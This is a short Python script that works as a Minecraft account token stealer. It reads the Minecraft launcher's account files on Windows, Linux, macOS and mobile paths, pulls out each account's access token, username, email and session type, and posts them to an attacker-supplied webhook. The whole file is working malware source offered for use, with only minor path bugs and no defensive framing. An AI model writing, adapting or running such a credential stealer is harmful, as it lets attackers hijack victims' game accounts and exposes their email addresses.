import json, os, requests

webhook = 'Your webhook drrr'

accounts = []

def getUser():
    return os.path.split(os.path.expanduser('~'))[-1]

def sendWebhook():
    embeds = []
    count = 0

    for account in accounts:
        if '@' in account[2]:
            name = 'Email Address'
        else:
            name = 'Xbox Username'

        embed = [{
            'fields': [
                {'name': name, 'value': account[2], 'inline': False},
                {'name': 'Username', 'value': account[0], 'inline': False},
                {'name': 'Session Type', 'value': account[1], 'inline': False},
                {'name': 'Session Authorization', 'value': account[3], 'inline': False}
            ]
        }]

        headers = {
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
        }

        payload = json.dumps({'embeds': embed})
        req = requests.post(url=webhook, data=payload, headers=headers).text

def getLocations():
    if os.name == 'nt':
        locations = [
            f'{os.getenv("APPDATA")}\\.minecraft\\launcher_accounts.json',
            f'{os.getenv("APPDATA")}\\Local\Packages\\Microsoft.MinecraftUWP_8wekyb3d8bbwe\\LocalState\\games\\com.mojang\\'
        ]
        return locations
    else:
        locations = [
            f'\\home\\{getUser()}\\.minecraft\\launcher_accounts.json',
            f'\\sdcard\\games\\com.mojang\\',
            f'\\~\\Library\\Application Support\\minecraft'
            f'Apps\\com.mojang.minecraftpe\\Documents\\games\\com.mojang\\'
        ]
        return locations

def main():
    for location in getLocations():
        if os.path.exists(location):
            auth_db = json.loads(open(location).read())['accounts']

            for d in auth_db:
                sessionKey = auth_db[d].get('accessToken')
                username = auth_db[d].get('minecraftProfile')['name']
                sessionType = auth_db[d].get('type')
                email = auth_db[d].get('username')
                if sessionKey != None or '':
                    accounts.append([username, sessionType, email, sessionKey])

    sendWebhook()

if __name__ == '__main__':
    main()
